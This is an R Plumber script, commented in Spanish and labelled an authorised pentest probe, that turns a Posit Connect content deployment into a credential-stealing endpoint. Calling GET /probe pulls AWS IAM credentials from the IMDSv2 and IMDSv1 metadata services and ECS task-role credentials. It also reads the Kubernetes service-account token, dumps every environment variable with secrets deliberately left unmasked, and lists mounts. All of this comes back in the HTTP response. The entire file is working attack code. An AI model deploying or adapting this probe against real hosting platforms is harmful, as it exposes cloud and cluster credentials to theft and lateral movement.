# plumber.R — sonda de contexto de ejecución (pentest autorizado)
# Objetivo: confirmar alcance IMDSv2, ECS task role, service-account K8s y entorno del pod
# desde DENTRO del sandbox de ejecución de Posit Connect.
#
# Uso: desplegado como contenido Plumber. Llamar a GET /probe.
# La salida se devuelve como texto en la respuesta HTTP (canal directo, no ciego).

library(plumber)

http_get <- function(url, headers = character(0), timeout = 3) {
  con_headers <- if (length(headers)) paste(names(headers), headers, sep = ": ") else character(0)
  tryCatch({
    h <- curl::new_handle(timeout = timeout, connecttimeout = timeout)
    if (length(con_headers)) curl::handle_setheaders(h, .list = as.list(setNames(headers, names(headers))))
    r <- curl::curl_fetch_memory(url, handle = h)
    list(status = r$status_code, body = rawToChar(r$content))
  }, error = function(e) list(status = NA, body = paste("ERR:", conditionMessage(e))))
}

http_put_token <- function(url, ttl = 21600, timeout = 3) {
  tryCatch({
    h <- curl::new_handle(timeout = timeout, connecttimeout = timeout,
                          customrequest = "PUT")
    curl::handle_setheaders(h, "X-aws-ec2-metadata-token-ttl-seconds" = as.character(ttl))
    r <- curl::curl_fetch_memory(url, handle = h)
    list(status = r$status_code, body = rawToChar(r$content))
  }, error = function(e) list(status = NA, body = paste("ERR:", conditionMessage(e))))
}

read_file_safe <- function(path) {
  tryCatch(paste(readLines(path, warn = FALSE), collapse = "\n"),
           error = function(e) paste("ERR:", conditionMessage(e)))
}

#* @get /probe
#* @serializer text
function() {
  out <- c()
  add <- function(...) out <<- c(out, sprintf(...))

  add("=== 1. IDENTIDAD DEL POD ===")
  add("whoami/id      : %s", tryCatch(system("id", intern = TRUE), error = function(e) "n/a"))
  add("hostname       : %s", tryCatch(system("hostname", intern = TRUE), error = function(e) "n/a"))
  add("R version      : %s", R.version.string)

  add("\n=== 2. IMDSv2 (token PUT -> creds GET) ===")
  tok <- http_put_token("http://169.254.169.254/latest/api/token")
  add("PUT /latest/api/token  -> status=%s", as.character(tok$status))
  if (!is.na(tok$status) && tok$status == 200) {
    token <- tok$body
    hdr <- c("X-aws-ec2-metadata-token" = token)
    role <- http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr)
    add("GET  role name         -> status=%s body=%s", as.character(role$status), role$body)
    if (!is.na(role$status) && role$status == 200 && nchar(role$body) > 0) {
      rn <- strsplit(role$body, "\n")[[1]][1]
      creds <- http_get(paste0("http://169.254.169.254/latest/meta-data/iam/security-credentials/", rn), hdr)
      add("GET  creds [%s]        -> status=%s", rn, as.character(creds$status))
      add("CREDS_BODY_BEGIN\n%s\nCREDS_BODY_END", creds$body)
    }
  } else {
    add("IMDSv2 token no obtenido (posible hop-limit=1, NetworkPolicy, o v1-only). Ver seccion 3/4.")
  }

  add("\n=== 3. IMDSv1 (GET directo sin token) ===")
  v1 <- http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  add("GET  v1 role name      -> status=%s body=%s", as.character(v1$status), v1$body)

  add("\n=== 4. ECS TASK ROLE (169.254.170.2) ===")
  ecs_uri <- Sys.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
  add("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI = '%s'", ecs_uri)
  if (nzchar(ecs_uri)) {
    ecs <- http_get(paste0("http://169.254.170.2", ecs_uri))
    add("GET  ECS creds         -> status=%s", as.character(ecs$status))
    add("ECS_BODY_BEGIN\n%s\nECS_BODY_END", ecs$body)
  }

  add("\n=== 5. SERVICE ACCOUNT KUBERNETES ===")
  add("SA token       :\n%s", read_file_safe("/var/run/secrets/kubernetes.io/serviceaccount/token"))
  add("SA namespace   : %s", read_file_safe("/var/run/secrets/kubernetes.io/serviceaccount/namespace"))
  add("KUBERNETES_SERVICE_HOST = %s", Sys.getenv("KUBERNETES_SERVICE_HOST", "n/a"))

  add("\n=== 6. VARIABLES DE ENTORNO DEL POD ===")
  env <- Sys.getenv()
  # marcar (no ocultar) posibles secretos para el informe
  for (k in sort(names(env))) add("%s=%s", k, env[[k]])

  add("\n=== 7. FILESYSTEM / MONTAJES ===")
  add("mounts:\n%s", tryCatch(paste(system("mount", intern = TRUE), collapse = "\n"), error = function(e) "n/a"))
  add("cwd contents:\n%s", paste(list.files(".", all.files = TRUE), collapse = "\n"))

  paste(out, collapse = "\n")
}
